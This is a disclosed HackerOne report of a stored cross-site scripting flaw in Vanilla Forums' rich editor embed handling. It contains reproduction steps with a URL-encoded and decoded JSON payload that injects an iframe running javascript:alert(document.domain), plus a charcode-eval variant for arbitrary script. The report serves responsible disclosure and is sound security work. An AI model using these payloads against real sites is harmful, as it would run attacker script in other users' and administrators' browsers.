@@ -1,0 +1,131 @@
+ReportLink:https://hackerone.com/reports/530853
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/klmunday
+ReportedTo:Vanilla(vanilla)
+BountyAmount:150.0
+Severity:medium
+State:Closed
+DateOfDisclosure:17.07.2019 20:14:08
+
+Summary:
+
+**Summary:**
+Embedded posts containing images can be maliciously crafted to insert Javascript code to run on page load.
+
+**Description:**
+
+
+## Steps to reproduce:
+1. Ensure you are logged into an account (no special permissions are needed)
+2. Navigate to any page with the `richEditor` component (e.g. any forum post)
+3. Write anything in the editor and click Share/send
+4. Intercept the request (Via BurpSuite etc)
+5. Edit the request and change the `Body` parameter to the following:
+```
+%5B%7B%22insert%22%3A%7B%22embed-external%22%3A%7B%22data%22%3A%7B%22url%22%3A%22%22%2C%22type%22%3A%22quote%22%2C%22name%22%3Anull%2C%22body%22%3Anull%2C%22photoUrl%22%3Anull%2C%22height%22%3Anull%2C%22width%22%3Anull%2C%22attributes%22%3A%7B%22commentID%22%3A102%2C%22bodyRaw%22%3A%5B%7B%22insert%22%3A%7B%22embed-external%22%3A%7B%22data%22%3A%7B%22mediaID%22%3A0%2C%22url%22%3A%22%5C%22%3E%3C%2Fa%3Efake%20embed%20text%3Ciframe%20src%3Djavascript%3Aalert%28document.domain%29%20style%3D%5C%22display%3Anone%22%2C%22name%22%3A%22%22%2C%22type%22%3A%22image%22%2C%22size%22%3A0%2C%22width%22%3A0%2C%22height%22%3A0%2C%22dateInserted%22%3A%222019-04-07T20%3A25%3A04%2B00%3A00%22%2C%22insertUserID%22%3A0%2C%22foreignType%22%3A%22embed%22%2C%22foreignID%22%3A0%7D%2C%22loaderData%22%3A%7B%22type%22%3A%22image%22%7D%7D%7D%7D%2C%7B%22insert%22%3A%22%5Cn%22%7D%5D%2C%22dateInserted%22%3A%222019-04-07T20%3A25%3A05%2B00%3A00%22%2C%22dateUpdated%22%3Anull%2C%22insertUser%22%3A%7B%22userID%22%3A7%2C%22name%22%3A%22test%20member%22%2C%22photoUrl%22%3A%22http%3A%2F%2Flocalhost%2Fapplications%2Fdashboard%2Fdesign%2Fimages%2Fdefaulticon.png%22%2C%22dateLastActive%22%3A%222019-04-07T02%3A49%3A09%2B00%3A00%22%7D%2C%22url%22%3A%22%22%2C%22format%22%3A%22Rich%22%7D%7D%2C%22loaderData%22%3A%7B%22type%22%3A%22link%22%2C%22link%22%3A%22%22%7D%7D%7D%7D%2C%7B%22insert%22%3A%22%5Cn%22%7D%5D
+```
+6. Forward the request
+7. XSS should now trigger for any user who loads that page
+
+## Examples:
+#F464143
+
+This also occurs in private messages:
+#F464153
+
+and activity posts:
+#F464154
+
+
+## Anything else we should know?
+The url-decoded contents of the post is:
+```
+[
+{
+	"insert":
+	{
+		"embed-external":
+		{
+			"data":
+			{
+				"url": "",
+				"type": "quote",
+				"name": null,
+				"body": null,
+				"photoUrl": null,
+				"height": null,
+				"width": null,
+				"attributes":
+				{
+					"commentID": 102,
+					"bodyRaw": [
+					{
+						"insert":
+						{
+							"embed-external":
+							{
+								"data":
+								{
+									"mediaID": 0,
+									"url": "\"></a>fake embed text<iframe src=javascript:alert(document.domain) style=\"display:none",
+									"name": "",
+									"type": "image",
+									"size": 0,
+									"width": 0,
+									"height": 0,
+									"dateInserted": "2019-04-07T20:25:04+00:00",
+									"insertUserID": 0,
+									"foreignType": "embed",
+									"foreignID": 0
+								},
+								"loaderData":
+								{
+									"type": "image"
+								}
+							}
+						}
+					},
+					{
+						"insert": "\n"
+					}],
+					"dateInserted": "2019-04-07T20:25:05+00:00",
+					"dateUpdated": null,
+					"insertUser":
+					{
+						"userID": 7,
+						"name": "test member",
+						"photoUrl": "http://localhost/applications/dashboard/design/images/defaulticon.png",
+						"dateLastActive": "2019-04-07T02:49:09+00:00"
+					},
+					"url": "",
+					"format": "Rich"
+				}
+			},
+			"loaderData":
+			{
+				"type": "link",
+				"link": ""
+			}
+		}
+	}
+},
+{
+	"insert": "\n"
+}]
+```
+It seems to be that `insert > embed-external > data > attributes > bodyRaw > insert > embed-external > data > url` has an issue where it is parsed incorrectly and is inserted "as is" into html content. I could not seem to replicate this vulnerability with only an image post, it has to be an embedded image post.
+
+Payloads containing spaces can also be ran by eval'ing an array of charcodes, e.g. 
+```
+"url": "\"></a>fake embed text<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,118,97,108,32,61,32,34,120,115,115,34,59,10,97,108,101,114,116,40,118,97,108,41,59])) style=\"display:none",
+```
+would run:
+```js
+let val = "xss";
+alert(val);
+```
+when users view the page.
+
+## Impact
+
+An attacker could craft a malicious content to run arbitrary Javascript code upon loading the content, this can affect every user who views the content. Including Admins and malicious payloads can be created with the aim of getting an Admin to perform admin-only actions and to retrieve user information such as email addresses (if not publicly viewable) etc.
